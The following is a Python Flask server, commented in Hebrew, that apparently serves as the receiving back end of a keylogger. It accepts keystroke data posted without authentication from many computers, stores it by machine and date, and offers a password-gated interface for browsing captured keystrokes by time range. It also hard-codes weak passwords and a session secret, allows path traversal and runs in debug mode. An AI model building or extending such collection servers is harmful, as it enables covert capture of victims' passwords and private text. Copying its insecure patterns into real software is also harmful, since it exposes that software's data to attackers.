import os
import json
from flask import Flask, request, jsonify, session
from flask_cors import CORS


app = Flask(__name__)
cors = CORS(app, supports_credentials=True)
# נתיב לשמירת הלוגים
BASE_DIR = "logs"

app.secret_key = "super_secret_key"  # מפתח לסשנים

AUTHORIZED_USERS = {"chilli": "1234", "baruch": "4321",
                    "ezra": "0520", "erez": "1234", "dov": "1234"}


@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('userName')
    password = request.json.get('password')

    if username not in AUTHORIZED_USERS:
        return jsonify({"error": "❌ Username does not exist."}), 401

    if AUTHORIZED_USERS[username] != str(password):
        return jsonify({"error": "❌ Incorrect password."}), 401

    # Sauvegarde du nom d'utilisateur dans la session
    session['user'] = username
    return jsonify({"message": "✅ Successfully logged in!"}), 200


def save_logs(data):
    computer_id = data.get("computer_id")
    logs = data.get("logs", [])

    if not computer_id or not logs:
        return {'error': 'חסר computer_id או logs'}, 400

    # יצירת תיקיית המחשב אם אינה קיימת
    computer_dir = os.path.join(BASE_DIR, computer_id)
    os.makedirs(computer_dir, exist_ok=True)

    for log in logs:
        timestamp = log.get("timestamp")  # שעה בפורמט HH:MM:SS
        datestamp = log.get("datestamp")  # תאריך בפורמט YYYY-MM-DD
        key_data = log.get("key_data")

        if not (timestamp and datestamp and key_data):
            continue

        # קובץ JSON לפי תאריך
        log_file = os.path.join(computer_dir, f"{datestamp}.jsonl")

        # יצירת רשומה בפורמט JSON
        log_entry = json.dumps({timestamp: key_data})

        # כתיבת הרשומה ישירות כ"שורה" בקובץ (append)
        with open(log_file, "a") as f:
            f.write(log_entry + "\n")

        print(
            f"✅ A record has been added to the computer.{computer_id}': {log_entry}")

    return {'message': 'הלוגים נשמרו בהצלחה'}, 200


# נתיב לקבלת נתונים
@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    if not data:
        return jsonify({'error': 'לא התקבלו נתונים'}), 400

    result, status = save_logs(data)
    return jsonify(result), status


# פונקציה לקריאת לוגים והחזרתם עם סינון לפי שעה
def read_logs(computer_id, date, start_time=None, end_time=None):
    log_file = os.path.join(BASE_DIR, computer_id, f"{date}.jsonl")

    # בדיקה אם הקובץ קיים
    if not os.path.exists(log_file):
        return {'error': 'Log file not found'}, 404

    logs = {}
    with open(log_file, "r") as f:
        for line in f:
            entry = json.loads(line.strip())  # קריאת כל שורה כ-JSON
            for timestamp, key_data in entry.items():
                # סינון לפי שעה אם נדרש
                if start_time and timestamp < start_time:
                    continue
                if end_time and timestamp > end_time:
                    continue

                logs[timestamp] = key_data  # שמירת הלוגים המסוננים

    return {'logs': logs}, 200


@app.route('/computers', methods=['GET'])
def get_computers():
    if not os.path.exists(BASE_DIR):  # אם התיקייה לא קיימת, נחזיר רשימה ריקה
        return jsonify({"computers": []})

    computers = [d for d in os.listdir(
        BASE_DIR) if os.path.isdir(os.path.join(BASE_DIR, d))]
    return jsonify({"computers": computers})


# נתיב להחזרת הלוגים לפי מחשב, תאריך ושעות אופציונליות
@app.route('/logs', methods=['GET'])
def get_logs():
    # בדיקה אם המשתמש מחובר באמצעות סשן
    if 'user' not in session:
        return jsonify({'error': '❌ "You must log in first!'}), 401

    computer_id = request.args.get('computer_id')
    date = request.args.get('date')
    start_time = request.args.get('start_time')  # שעה התחלתית אופציונלית
    end_time = request.args.get('end_time')  # שעה סופית אופציונלית

    if not computer_id or not date:
        return jsonify({'error': 'Missing computer_id or date'}), 400

    result, status = read_logs(computer_id, date, start_time, end_time)
    return jsonify(result), status


# הרצת השרת
if __name__ == '__main__':
    app.run(debug=True)
